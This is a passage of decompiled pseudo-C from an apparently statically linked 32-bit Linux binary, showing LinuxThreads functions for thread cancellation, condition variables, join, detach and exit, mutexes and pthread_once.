      _pthread_do_exit(a1, (void *)0xFFFFFFFF, (unsigned int)&retaddr);
  }
  return result;
}

//----- (0804DFF9) --------------------------------------------------------
signed int __usercall pthread_setcanceltype@<eax>(off_t a1@<ebp>, unsigned int a2, _DWORD *a3)
{
  signed int result; // eax@1
  void **v4; // eax@2
  char v5; // [esp+8h] [ebp-4h]@6

  result = 22;
  if ( a2 <= 1 )
  {
    v4 = thread_self_4();
    if ( a3 )
      *a3 = *((char *)v4 + 65);
    *((_BYTE *)v4 + 65) = a2;
    if ( *((_BYTE *)v4 + 66) )
    {
      if ( *((_WORD *)v4 + 32) == 256 )
        _pthread_do_exit(a1, (void *)0xFFFFFFFF, (unsigned int)&v5);
    }
    result = 0;
  }
  return result;
}

//----- (0804E047) --------------------------------------------------------
signed int __usercall pthread_setcancelstate@<eax>(off_t a1@<ebp>, unsigned int a2, _DWORD *a3)
{
  signed int result; // eax@1
  void **v4; // eax@2
  char v5; // [esp+8h] [ebp-4h]@6

  result = 22;
  if ( a2 <= 1 )
  {
    v4 = thread_self_4();
    if ( a3 )
      *a3 = *((char *)v4 + 64);
    *((_BYTE *)v4 + 64) = a2;
    if ( *((_BYTE *)v4 + 66) )
    {
      if ( *((_WORD *)v4 + 32) == 256 )
        _pthread_do_exit(a1, (void *)0xFFFFFFFF, (unsigned int)&v5);
    }
    result = 0;
  }
  return result;
}

//----- (0804E095) --------------------------------------------------------
signed int __cdecl pthread_cancel(int a1)
{
  int *v1; // edi@1
  int v2; // edx@1
  int v3; // ebx@1
  signed int result; // eax@3
  int v5; // eax@4
  bool v6; // zf@4
  int v7; // eax@7
  int v8; // esi@7
  int v9; // ebp@7

  v1 = &_pthread_handles[4 * (a1 & 0x3FF)];
  _pthread_lock((volatile signed __int32 *)v1, 0);
  v3 = v1[2];
  if ( v3 && *(_DWORD *)(v3 + 16) == a1 )
  {
    v5 = *(char *)(v3 + 66);
    v6 = *(_BYTE *)(v3 + 64) == 1;
    *(_BYTE *)(v3 + 66) = 1;
    if ( v6 || v5 )
    {
      _pthread_unlock((volatile signed __int32 *)v1);
    }
    else
    {
      v7 = *(_DWORD *)(v3 + 444);
      v8 = 0;
      v9 = *(_DWORD *)(v3 + 20);
      if ( v7 )
      {
        v8 = (*(int (__cdecl **)(_DWORD, int, int, int))(v7 + 4))(*(_DWORD *)v7, v3, v2, v2);
        *(_BYTE *)(v3 + 440) = v8;
      }
      _pthread_unlock((volatile signed __int32 *)v1);
      if ( v8 )
        _pthread_restart_new(v3);
      else
        kill(v9, _pthread_sig_cancel);
    }
    result = 0;
  }
  else
  {
    _pthread_unlock((volatile signed __int32 *)v1);
    result = 3;
  }
  return result;
}
// 805D4C0: using guessed type int _pthread_handles[];

//----- (0804E148) --------------------------------------------------------
int *__usercall enqueue_0@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx@5

  while ( 1 )
  {
    v2 = *result;
    if ( !*result )
      break;
    if ( *(_DWORD *)(a2 + 24) > *(_DWORD *)(v2 + 24) )
    {
      *(_DWORD *)(a2 + 8) = v2;
      break;
    }
    result = (int *)(v2 + 8);
  }
  *result = a2;
  return result;
}

//----- (0804E165) --------------------------------------------------------
signed int __usercall remove_from_queue_0@<eax>(int *a1@<eax>, int a2@<edx>)
{
  int *i; // ebx@1
  signed int result; // eax@3
  int v4; // ecx@5

  for ( i = a1; ; i = (int *)(v4 + 8) )
  {
    v4 = *i;
    if ( !*i )
      break;
    if ( v4 == a2 )
    {
      *i = *(_DWORD *)(v4 + 8);
      result = 1;
      *(_DWORD *)(v4 + 8) = 0;
      return result;
    }
  }
  return 0;
}

//----- (0804E18E) --------------------------------------------------------
int __cdecl pthread_cond_init(_DWORD *a1)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  return 0;
}

//----- (0804E1A9) --------------------------------------------------------
int __cdecl pthread_cond_destroy(int a1)
{
  return *(_DWORD *)(a1 + 8) >= 1u ? 0x10 : 0;
}

//----- (0804E1B9) --------------------------------------------------------
int pthread_condattr_init()
{
  return 0;
}

//----- (0804E1BC) --------------------------------------------------------
int pthread_condattr_destroy()
{
  return 0;
}

//----- (0804E1BF) --------------------------------------------------------
int __cdecl pthread_condattr_getpshared(int a1, _DWORD *a2)
{
  *a2 = 0;
  return 0;
}

//----- (0804E1CC) --------------------------------------------------------
int __cdecl pthread_condattr_setpshared(int a1, unsigned int a2)
{
  int result; // eax@1

  result = 22;
  if ( a2 <= 1 )
    result = a2 >= 1 ? 0x26 : 0;
  return result;
}

//----- (0804E1E2) --------------------------------------------------------
int __usercall _pthread_set_own_extricate_if_0@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebx@1
  int v3; // esi@1
  int v5; // [esp+0h] [ebp-Ch]@0

  v2 = a1;
  v3 = a2;
  if ( a2 )
  {
    if ( *(_BYTE *)(a1 + 64) )
      return v5;
  }
  else
  {
    _pthread_lock(*(volatile signed __int32 **)(a1 + 28), a1);
  }
  *(_DWORD *)(v2 + 444) = v3;
  if ( !v3 )
    _pthread_unlock(*(volatile signed __int32 **)(v2 + 28));
  return v5;
}

//----- (0804E21D) --------------------------------------------------------
unsigned int __usercall restart_1@<eax>(int a1@<eax>)
{
  return _pthread_restart_new(a1);
}

//----- (0804E22A) --------------------------------------------------------
int __cdecl pthread_cond_broadcast(int a1)
{
  int v1; // esi@1
  int v2; // ebx@2
  int v3; // eax@2

  _pthread_lock((volatile signed __int32 *)a1, 0);
  v1 = *(_DWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 8) = 0;
  _pthread_unlock((volatile signed __int32 *)a1);
  while ( v1 )
  {
    v2 = *(_DWORD *)(v1 + 8);
    *(_BYTE *)(v1 + 441) = 1;
    *(_DWORD *)(v1 + 8) = 0;
    v3 = v1;
    v1 = v2;
    restart_1(v3);
  }
  return 0;
}

//----- (0804E278) --------------------------------------------------------
void **thread_self_5()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804E2B7) --------------------------------------------------------
signed int __cdecl cond_extricate_func(int a1, int a2)
{
  void **v2; // ST20_4@1
  signed int v3; // esi@1

  v2 = thread_self_5();
  _pthread_lock((volatile signed __int32 *)a1, (int)v2);
  v3 = remove_from_queue_0((int *)(a1 + 8), a2);
  _pthread_unlock((volatile signed __int32 *)a1);
  return v3;
}

//----- (0804E2F3) --------------------------------------------------------
int __usercall suspend_2@<eax>(int a1@<eax>)
{
  return _pthread_wait_for_restart_signal(a1);
}

//----- (0804E300) --------------------------------------------------------
signed int __cdecl pthread_cond_timedwait(int a1, off_t a2, _DWORD *a3)
{
  int v3; // eax@1
  signed int v4; // edx@3
  int v5; // ebx@5
  int v6; // edi@9
  int v8; // [esp+10h] [ebp-1Ch]@4
  signed int (__cdecl *v9)(int, int); // [esp+14h] [ebp-18h]@4
  void **v10; // [esp+18h] [ebp-14h]@1
  char v11; // [esp+1Ch] [ebp-10h]@20

  v10 = thread_self_5();
  v3 = *(_DWORD *)(a2 + 12);
  if ( v3 == 3 || !v3 || (v4 = 22, *(void ***)(a2 + 8) == v10) )
  {
    v8 = a1;
    v9 = cond_extricate_func;
    *((_BYTE *)v10 + 441) = 0;
    _pthread_set_own_extricate_if_0((int)v10, (int)&v8);
    _pthread_lock((volatile signed __int32 *)a1, (int)v10);
    if ( !*((_BYTE *)v10 + 66) || (v5 = 1, *((_BYTE *)v10 + 64)) )
    {
      enqueue_0((int *)(a1 + 8), (int)v10);
      v5 = 0;
    }
    _pthread_unlock((volatile signed __int32 *)a1);
    if ( v5 )
    {
      _pthread_set_own_extricate_if_0((int)v10, 0);
      goto LABEL_20;
    }
    v6 = 0;
    pthread_mutex_unlock(a2);
    while ( 1 )
    {
      if ( !_pthread_timedsuspend_new(v5, a2, v6, a1, (int)v10, a3) )
      {
        _pthread_lock((volatile signed __int32 *)a1, (int)v10);
        v5 = remove_from_queue_0((int *)(a1 + 8), (int)v10);
        _pthread_unlock((volatile signed __int32 *)a1);
        if ( v5 )
        {
          _pthread_set_own_extricate_if_0((int)v10, 0);
          pthread_mutex_lock(a2);
          return 110;
        }
        suspend_2((int)v10);
      }
      if ( *((_BYTE *)v10 + 441) || *((_BYTE *)v10 + 440) && !*((_BYTE *)v10 + 64) )
        break;
      ++v6;
    }
    _pthread_set_own_extricate_if_0((int)v10, 0);
    if ( *((_BYTE *)v10 + 440) && !*((_BYTE *)v10 + 64) )
    {
      *((_BYTE *)v10 + 440) = 0;
      pthread_mutex_lock(a2);
LABEL_20:
      _pthread_do_exit(a2, (void *)0xFFFFFFFF, (unsigned int)&v11);
    }
    while ( --v6 != -1 )
      restart_1((int)v10);
    pthread_mutex_lock(a2);
    v4 = 0;
  }
  return v4;
}

//----- (0804E4B2) --------------------------------------------------------
signed int __cdecl pthread_cond_wait(int a1, int a2)
{
  int v2; // eax@1
  signed int v3; // edx@3
  signed int v4; // ebx@5
  int v5; // ebx@9
  int v7; // [esp+10h] [ebp-18h]@4
  signed int (__cdecl *v8)(int, int); // [esp+14h] [ebp-14h]@4
  void **v9; // [esp+18h] [ebp-10h]@1
  char v10; // [esp+1Ch] [ebp-Ch]@17
  int savedregs; // [esp+28h] [ebp+0h]@17

  v9 = thread_self_5();
  v2 = *(_DWORD *)(a2 + 12);
  if ( v2 == 3 || !v2 || (v3 = 22, *(void ***)(a2 + 8) == v9) )
  {
    v7 = a1;
    v8 = cond_extricate_func;
    *((_BYTE *)v9 + 441) = 0;
    _pthread_set_own_extricate_if_0((int)v9, (int)&v7);
    _pthread_lock((volatile signed __int32 *)a1, (int)v9);
    if ( !*((_BYTE *)v9 + 66) || (v4 = 1, *((_BYTE *)v9 + 64)) )
    {
      enqueue_0((int *)(a1 + 8), (int)v9);
      v4 = 0;
    }
    _pthread_unlock((volatile signed __int32 *)a1);
    if ( v4 )
    {
      _pthread_set_own_extricate_if_0((int)v9, 0);
      goto LABEL_17;
    }
    v5 = 0;
    pthread_mutex_unlock(a2);
    while ( 1 )
    {
      suspend_2((int)v9);
      if ( *((_BYTE *)v9 + 441) || *((_BYTE *)v9 + 440) && !*((_BYTE *)v9 + 64) )
        break;
      ++v5;
    }
    _pthread_set_own_extricate_if_0((int)v9, 0);
    if ( *((_BYTE *)v9 + 440) && !*((_BYTE *)v9 + 64) )
    {
      *((_BYTE *)v9 + 440) = 0;
      pthread_mutex_lock(a2);
LABEL_17:
      _pthread_do_exit((off_t)&savedregs, (void *)0xFFFFFFFF, (unsigned int)&v10);
    }
    while ( --v5 != -1 )
      restart_1((int)v9);
    pthread_mutex_lock(a2);
    v3 = 0;
  }
  return v3;
}

//----- (0804E5F0) --------------------------------------------------------
int __cdecl pthread_cond_signal(int a1)
{
  int v1; // ebx@1

  _pthread_lock((volatile signed __int32 *)a1, 0);
  v1 = *(_DWORD *)(a1 + 8);
  if ( v1 )
  {
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v1 + 8);
    *(_DWORD *)(v1 + 8) = 0;
  }
  _pthread_unlock((volatile signed __int32 *)a1);
  if ( v1 )
  {
    *(_BYTE *)(v1 + 441) = 1;
    restart_1(v1);
  }
  return 0;
}

//----- (0804E640) --------------------------------------------------------
int __usercall _pthread_set_own_extricate_if_1@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebx@1
  int v3; // esi@1
  int v5; // [esp+0h] [ebp-Ch]@0

  v2 = a1;
  v3 = a2;
  if ( a2 )
  {
    if ( *(_BYTE *)(a1 + 64) )
      return v5;
  }
  else
  {
    _pthread_lock(*(volatile signed __int32 **)(a1 + 28), a1);
  }
  *(_DWORD *)(v2 + 444) = v3;
  if ( !v3 )
    _pthread_unlock(*(volatile signed __int32 **)(v2 + 28));
  return v5;
}

//----- (0804E67B) --------------------------------------------------------
void **thread_self_6()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804E6BA) --------------------------------------------------------
_BOOL4 __cdecl join_extricate_func(int a1)
{
  void **v1; // ST20_4@1
  int v2; // eax@1
  bool v3; // dl@1
  _BOOL4 v4; // esi@1

  v1 = thread_self_6();
  _pthread_lock((volatile signed __int32 *)a1, (int)v1);
  v2 = *(_DWORD *)(a1 + 8);
  v3 = *(_DWORD *)(v2 + 56) != 0;
  *(_DWORD *)(v2 + 56) = 0;
  v4 = v3;
  _pthread_unlock((volatile signed __int32 *)a1);
  return v4;
}

//----- (0804E6FC) --------------------------------------------------------
int __usercall suspend_3@<eax>(int a1@<eax>)
{
  return _pthread_wait_for_restart_signal(a1);
}

//----- (0804E709) --------------------------------------------------------
void __usercall __noreturn _pthread_do_exit(off_t a1@<ebp>, void *a2, unsigned int a3)
{
  void **v3; // ebx@1
  int v4; // eax@2
  int v5; // esi@4
  void **v6; // esi@6
  void **addr; // [esp+10h] [ebp-9Ch]@8
  int v8; // [esp+14h] [ebp-98h]@8

  v3 = thread_self_6();
  *((_BYTE *)v3 + 64) = 1;
  *((_BYTE *)v3 + 65) = 0;
  _pthread_perform_cleanup(a1, a3);
  _pthread_destroy_specifics();
  _pthread_lock((volatile signed __int32 *)v3[7], (int)v3);
  v3[12] = a2;
  if ( v3[103] )
  {
    v4 = (unsigned int)v3[104] | _pthread_threads_events;
    if ( BYTE1(v4) & 1 )
    {
      v3[106] = (void *)9;
      v3[107] = v3;
      _pthread_last_event = (int)v3;
      _linuxthreads_death_event();
    }
  }
  v5 = (int)v3[14];
  *((_BYTE *)v3 + 44) = 1;
  _pthread_unlock((volatile signed __int32 *)v3[7]);
  if ( v5 )
    _pthread_restart_new(v5);
  v6 = _pthread_main_thread;
  if ( v3 == _pthread_main_thread && _pthread_manager_request >= 0 )
  {
    addr = _pthread_main_thread;
    v8 = 3;
    while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
      ;
    suspend_3((int)v6);
    exit(a1, 0);
  }
  exit(0);
}
// 804E63D: using guessed type int _linuxthreads_death_event(void);
// 80618A0: using guessed type void **_pthread_main_thread;
// 806A604: using guessed type int _pthread_threads_events;
// 806A60C: using guessed type int _pthread_last_event;

//----- (0804E804) --------------------------------------------------------
void __usercall __noreturn pthread_exit(off_t a1@<ebp>, void *a2)
{
  void *retaddr; // [esp+14h] [ebp+0h]@1

  _pthread_do_exit(a1, a2, (unsigned int)&retaddr);
}

//----- (0804E815) --------------------------------------------------------
signed int __cdecl pthread_join(off_t a1, _DWORD *a2)
{
  int *v2; // esi@1
  int v3; // ebx@1
  signed int v5; // edi@12
  void **addr; // [esp+Ch] [ebp-B0h]@24
  int v7; // [esp+10h] [ebp-ACh]@24
  off_t v8; // [esp+14h] [ebp-A8h]@24
  int *v9; // [esp+A0h] [ebp-1Ch]@1
  _BOOL4 (__cdecl *v10)(int); // [esp+A4h] [ebp-18h]@1
  void **v11; // [esp+A8h] [ebp-14h]@1
  char v12; // [esp+ACh] [ebp-10h]@19

  v11 = thread_self_6();
  v10 = join_extricate_func;
  v2 = &_pthread_handles[4 * (a1 & 0x3FF)];
  v9 = &_pthread_handles[4 * (a1 & 0x3FF)];
  _pthread_lock((volatile signed __int32 *)v2, (int)v11);
  v3 = v2[2];
  if ( !v3 || *(_DWORD *)(v3 + 16) != a1 )
  {
    _pthread_unlock((volatile signed __int32 *)v2);
    return 3;
  }
  if ( (void **)v3 == v11 )
  {
    _pthread_unlock((volatile signed __int32 *)v2);
    return 35;
  }
  if ( *(_BYTE *)(v3 + 45) || *(_DWORD *)(v3 + 56) )
  {
    _pthread_unlock((volatile signed __int32 *)v2);
    return 22;
  }
  if ( !*(_BYTE *)(v3 + 44) )
  {
    _pthread_set_own_extricate_if_1((int)v11, (int)&v9);
    if ( !*((_BYTE *)v11 + 66) || (v5 = 1, *((_BYTE *)v11 + 64)) )
    {
      v5 = 0;
      *(_DWORD *)(v3 + 56) = v11;
    }
    _pthread_unlock((volatile signed __int32 *)v2);
    if ( v5 )
    {
      _pthread_set_own_extricate_if_1((int)v11, 0);
      goto LABEL_19;
    }
    suspend_3((int)v11);
    _pthread_set_own_extricate_if_1((int)v11, 0);
    if ( *((_BYTE *)v11 + 440) && !*((_BYTE *)v11 + 64) )
    {
      *((_BYTE *)v11 + 440) = 0;
LABEL_19:
      _pthread_do_exit(a1, (void *)0xFFFFFFFF, (unsigned int)&v12);
    }
    _pthread_lock((volatile signed __int32 *)v2, (int)v11);
  }
  if ( a2 )
    *a2 = *(_DWORD *)(v3 + 48);
  _pthread_unlock((volatile signed __int32 *)v2);
  if ( _pthread_manager_request >= 0 )
  {
    v7 = 1;
    addr = v11;
    v8 = a1;
    while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
      ;
  }
  return 0;
}
// 805D4C0: using guessed type int _pthread_handles[];

//----- (0804E9FC) --------------------------------------------------------
signed int __cdecl pthread_detach(int a1)
{
  int *v1; // esi@1
  int v2; // eax@1
  signed int result; // eax@3
  int v4; // ebx@9
  void **addr; // [esp+Ch] [ebp-A0h]@11
  int v6; // [esp+10h] [ebp-9Ch]@11
  int v7; // [esp+14h] [ebp-98h]@11

  v1 = &_pthread_handles[4 * (a1 & 0x3FF)];
  _pthread_lock((volatile signed __int32 *)v1, 0);
  v2 = v1[2];
  if ( v2 && *(_DWORD *)(v2 + 16) == a1 )
  {
    if ( *(_BYTE *)(v2 + 45) )
    {
      _pthread_unlock((volatile signed __int32 *)v1);
      result = 22;
    }
    else if ( *(_DWORD *)(v2 + 56) )
    {
      _pthread_unlock((volatile signed __int32 *)v1);
      result = 0;
    }
    else
    {
      *(_BYTE *)(v2 + 45) = 1;
      v4 = *(char *)(v2 + 44);
      _pthread_unlock((volatile signed __int32 *)v1);
      if ( v4 && _pthread_manager_request >= 0 )
      {
        v6 = 1;
        addr = thread_self_6();
        v7 = a1;
        while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
          ;
      }
      result = 0;
    }
  }
  else
  {
    _pthread_unlock((volatile signed __int32 *)v1);
    result = 3;
  }
  return result;
}
// 805D4C0: using guessed type int _pthread_handles[];

//----- (0804EAD8) --------------------------------------------------------
int _fresetlockfiles()
{
  int *i; // ebx@1
  unsigned int v2[2]; // [esp+20h] [ebp-8h]@1

  pthread_mutexattr_init(v2);
  pthread_mutexattr_settype(v2, 1u);
  for ( i = stdio_openlist; i; i = (int *)i[8] )
    pthread_mutex_init(i + 14, (signed int *)v2);
  return pthread_mutexattr_destroy();
}
// 806199C: using guessed type int *stdio_openlist;

//----- (0804EB20) --------------------------------------------------------
signed int __usercall _pthread_trylock@<eax>(volatile signed __int32 *a1@<eax>)
{
  do
  {
    if ( *a1 )
      return 16;
  }
  while ( _InterlockedCompareExchange(a1, 1, 0) );
  return 0;
}

//----- (0804EB4B) --------------------------------------------------------
signed int __usercall _pthread_alt_trylock@<eax>(volatile signed __int32 *a1@<eax>)
{
  do
  {
    if ( *a1 )
      return 16;
  }
  while ( _InterlockedCompareExchange(a1, 1, 0) );
  return 0;
}

//----- (0804EB76) --------------------------------------------------------
int __cdecl pthread_mutex_init(_DWORD *a1, signed int *a2)
{
  signed int v2; // edx@1

  v2 = 3;
  a1[4] = 0;
  a1[5] = 0;
  if ( a2 )
    v2 = *a2;
  a1[3] = v2;
  a1[1] = 0;
  a1[2] = 0;
  return 0;
}

//----- (0804EBAB) --------------------------------------------------------
signed int __cdecl pthread_mutex_destroy(int a1)
{
  signed int v1; // eax@1
  signed int result; // eax@4
  bool v3; // zf@5

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 < 0 )
    return 22;
  if ( v1 <= 1 )
  {
    v3 = (*(_BYTE *)(a1 + 16) & 1) == 0;
  }
  else
  {
    if ( v1 > 3 )
      return 22;
    v3 = *(_DWORD *)(a1 + 16) == 0;
  }
  if ( v3 )
    result = 0;
  else
    result = 16;
  return result;
}

//----- (0804EBDB) --------------------------------------------------------
int __cdecl pthread_mutexattr_init(_DWORD *a1)
{
  *a1 = 3;
  return 0;
}

//----- (0804EBE8) --------------------------------------------------------
int pthread_mutexattr_destroy()
{
  return 0;
}

//----- (0804EBEB) --------------------------------------------------------
signed int __cdecl pthread_mutexattr_settype(unsigned int *a1, unsigned int a2)
{
  signed int result; // eax@1

  result = 22;
  if ( a2 <= 3 )
  {
    *a1 = a2;
    result = 0;
  }
  return result;
}

//----- (0804EC02) --------------------------------------------------------
int __cdecl pthread_mutexattr_gettype(_DWORD *a1, _DWORD *a2)
{
  *a2 = *a1;
  return 0;
}

//----- (0804EC11) --------------------------------------------------------
int __cdecl pthread_mutexattr_getpshared(int a1, _DWORD *a2)
{
  *a2 = 0;
  return 0;
}

//----- (0804EC1E) --------------------------------------------------------
int __cdecl pthread_mutexattr_setpshared(int a1, unsigned int a2)
{
  int result; // eax@1

  result = 22;
  if ( a2 <= 1 )
    result = a2 >= 1 ? 0x26 : 0;
  return result;
}

//----- (0804EC34) --------------------------------------------------------
int _pthread_once_fork_child()
{
  int result; // eax@1

  pthread_mutex_init(&once_masterlock, 0);
  pthread_cond_init(&once_finished);
  result = fork_generation;
  if ( fork_generation > 2147483643 )
  {
    fork_generation = 0;
  }
  else
  {
    result = fork_generation + 4;
    fork_generation += 4;
  }
  return result;
}
// 806620C: using guessed type int fork_generation;

//----- (0804EC76) --------------------------------------------------------
void **thread_self_7()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804ECB5) --------------------------------------------------------
signed int __cdecl pthread_mutex_unlock(int a1)
{
  signed int v1; // eax@1
  int v3; // eax@9

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 == 1 )
  {
    if ( *(void ***)(a1 + 8) == thread_self_7() )
    {
      v3 = *(_DWORD *)(a1 + 4);
      if ( v3 > 0 )
      {
        *(_DWORD *)(a1 + 4) = v3 - 1;
        return 0;
      }
      *(_DWORD *)(a1 + 8) = 0;
      goto LABEL_12;
    }
  }
  else
  {
    if ( v1 <= 1 )
    {
      if ( v1 )
        return 22;
LABEL_12:
      _pthread_unlock((volatile signed __int32 *)(a1 + 16));
      return 0;
    }
    if ( v1 != 2 )
    {
      if ( v1 != 3 )
        return 22;
      goto LABEL_17;
    }
    if ( *(void ***)(a1 + 8) == thread_self_7() && *(_DWORD *)(a1 + 16) )
    {
      *(_DWORD *)(a1 + 8) = 0;
LABEL_17:
      _pthread_alt_unlock((volatile signed __int32 *)(a1 + 16));
      return 0;
    }
  }
  return 1;
}

//----- (0804ED3F) --------------------------------------------------------
signed int _pthread_once_fork_parent()
{
  return pthread_mutex_unlock((int)&once_masterlock);
}

//----- (0804ED50) --------------------------------------------------------
signed int __cdecl pthread_mutex_trylock(int a1)
{
  signed int v1; // eax@1
  signed int v2; // esi@7
  void **v4; // edi@9

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 == 1 )
  {
    v4 = thread_self_7();
    if ( *(void ***)(a1 + 8) == v4 )
    {
      ++*(_DWORD *)(a1 + 4);
      v2 = 0;
    }
    else
    {
      v2 = _pthread_trylock((volatile signed __int32 *)(a1 + 16));
      if ( !v2 )
      {
        *(_DWORD *)(a1 + 8) = v4;
        *(_DWORD *)(a1 + 4) = 0;
      }
    }
    return v2;
  }
  if ( v1 > 1 )
  {
    if ( v1 == 2 )
    {
      v2 = _pthread_alt_trylock((volatile signed __int32 *)(a1 + 16));
      if ( !v2 )
        *(_DWORD *)(a1 + 8) = thread_self_7();
      return v2;
    }
    if ( v1 == 3 )
      return _pthread_alt_trylock((volatile signed __int32 *)(a1 + 16));
  }
  else if ( !v1 )
  {
    return _pthread_trylock((volatile signed __int32 *)(a1 + 16));
  }
  return 22;
}

//----- (0804EDD9) --------------------------------------------------------
signed int __cdecl pthread_mutex_timedlock(int a1, _DWORD *a2)
{
  signed int v2; // eax@2
  void **v3; // ebx@10
  signed int v4; // edx@12
  void **v5; // eax@14
  void **v6; // ebx@14
  signed int v7; // eax@8

  if ( a2[1] > 0x3B9AC9FFu )
    return 22;
  v2 = *(_DWORD *)(a1 + 12);
  if ( v2 == 1 )
  {
    v3 = thread_self_7();
    if ( *(void ***)(a1 + 8) == v3 )
    {
      ++*(_DWORD *)(a1 + 4);
    }
    else
    {
      _pthread_lock((volatile signed __int32 *)(a1 + 16), (int)v3);
      *(_DWORD *)(a1 + 8) = v3;
      *(_DWORD *)(a1 + 4) = 0;
    }
    return 0;
  }
  if ( v2 <= 1 )
  {
    if ( v2 )
      return 22;
    _pthread_lock((volatile signed __int32 *)(a1 + 16), 0);
    return 0;
  }
  if ( v2 == 2 )
  {
    v5 = thread_self_7();
    v4 = 35;
    v6 = v5;
    if ( *(void ***)(a1 + 8) == v5 )
      return v4;
    if ( !_pthread_alt_timedlock((volatile signed __int32 *)(a1 + 16), v5, a2) )
      return 110;
    *(_DWORD *)(a1 + 8) = v6;
    return 0;
  }
  if ( v2 != 3 )
    return 22;
  v7 = _pthread_alt_timedlock((volatile signed __int32 *)(a1 + 16), 0, a2);
  v4 = 0;
  if ( !v7 )
    return 110;
  return v4;
}

//----- (0804EE98) --------------------------------------------------------
signed int __cdecl pthread_mutex_lock(int a1)
{
  signed int v1; // eax@1
  signed int result; // eax@7
  void **v3; // ebx@9
  void **v4; // ebx@13

  v1 = *(_DWORD *)(a1 + 12);
  if ( v1 == 1 )
  {
    v3 = thread_self_7();
    if ( *(void ***)(a1 + 8) == v3 )
    {
      ++*(_DWORD *)(a1 + 4);
    }
    else
    {
      _pthread_lock((volatile signed __int32 *)(a1 + 16), (int)v3);
      *(_DWORD *)(a1 + 8) = v3;
      *(_DWORD *)(a1 + 4) = 0;
    }
    return 0;
  }
  if ( v1 <= 1 )
  {
    if ( v1 )
      return 22;
    _pthread_lock((volatile signed __int32 *)(a1 + 16), 0);
    return 0;
  }
  if ( v1 == 2 )
  {
    v4 = thread_self_7();
    result = 35;
    if ( *(void ***)(a1 + 8) == v4 )
      return result;
    _pthread_alt_lock((volatile signed __int32 *)(a1 + 16), v4);
    *(_DWORD *)(a1 + 8) = v4;
  }
  else
  {
    if ( v1 != 3 )
      return 22;
    _pthread_alt_lock((volatile signed __int32 *)(a1 + 16), 0);
  }
  return 0;
}

//----- (0804EF2F) --------------------------------------------------------
signed int _pthread_once_fork_prepare()
{
  return pthread_mutex_lock((int)&once_masterlock);
}

//----- (0804EF40) --------------------------------------------------------
int __cdecl pthread_once(int *a1, void (__fastcall *a2)(int, _DWORD))
{
  signed int v2; // ebx@7
  __int64 v3; // rax@8
  int v4; // ecx@8
  char v6; // [esp+14h] [ebp-18h]@8

  if ( *a1 != 2 )
  {
    pthread_mutex_lock((int)&once_masterlock);
    if ( (*a1 & 3) == 1 && (*a1 & 0xFFFFFFFC) != fork_generation )
      *a1 = 0;
    while ( (*a1 & 3) == 1 )
      pthread_cond_wait((int)&once_finished, (int)&once_masterlock);
    v2 = 0;
    if ( !*a1 )
    {
      *a1 = fork_generation | 1;
      pthread_mutex_unlock((int)&once_masterlock);
      v3 = pthread_cleanup_push(&v6, (int)pthread_once_cancelhandler, (int)a1);
      a2(v4, HIDWORD(v3));
      pthread_cleanup_pop((int)&v6, 0);
      pthread_mutex_lock((int)&once_masterlock);
      v2 = 1;
      *a1 = 2;
    }
    pthread_mutex_unlock((int)&once_masterlock);
    if ( v2 )
      pthread_cond_broadcast((int)&once_finished);
  }
  return 0;
}
// 806620C: using guessed type int fork_generation;

//----- (0804F022) --------------------------------------------------------
int __cdecl pthread_once_cancelhandler(_DWORD *a1)
{
  pthread_mutex_lock((int)&once_masterlock);
  *a1 = 0;
  pthread_mutex_unlock((int)&once_masterlock);
  return pthread_cond_broadcast((int)&once_finished);
}

//----- (0804F058) --------------------------------------------------------
